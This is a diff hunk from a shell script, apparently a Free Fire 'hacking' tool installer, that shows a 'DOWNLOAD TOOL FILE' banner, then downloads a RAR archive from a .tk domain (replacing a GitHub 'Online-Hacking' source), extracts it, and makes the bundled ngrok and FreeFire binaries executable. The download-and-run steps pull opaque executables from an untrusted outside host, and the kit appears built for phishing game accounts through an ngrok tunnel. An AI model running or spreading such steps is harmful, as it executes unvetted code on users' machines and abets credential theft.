@@ -139,9 +139,9 @@ echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   --------------------
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
-wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN.rar
-unrar x -Password SUMAN.rar
-rm -rf SUMAN.rar
+wget https://sandeeptech.tk/SANDEEP.rar
+unrar x SANDEEP.rar
+rm -rf SANDEEP.rar
 chmod +x ngrok
 chmod +x FF
 chmod +x FreeFire
